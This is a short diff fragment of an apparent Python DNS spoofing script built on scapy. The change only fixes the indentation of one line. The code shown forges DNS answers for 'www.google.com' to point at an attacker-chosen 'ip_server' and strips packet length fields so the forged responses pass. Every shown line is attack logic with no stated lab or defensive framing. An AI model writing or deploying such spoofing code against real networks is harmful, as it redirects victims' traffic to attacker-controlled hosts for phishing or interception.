@@ -10,7 +10,7 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
         if "www.google.com" in qname:
-           answer = scapy.DNSRR(rrname=qname, rdata=ip_server)
+            answer = scapy.DNSRR(rrname=qname, rdata=ip_server)
             scapy_packet[scapy.DNS].ancount = 1
             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.UDP].len
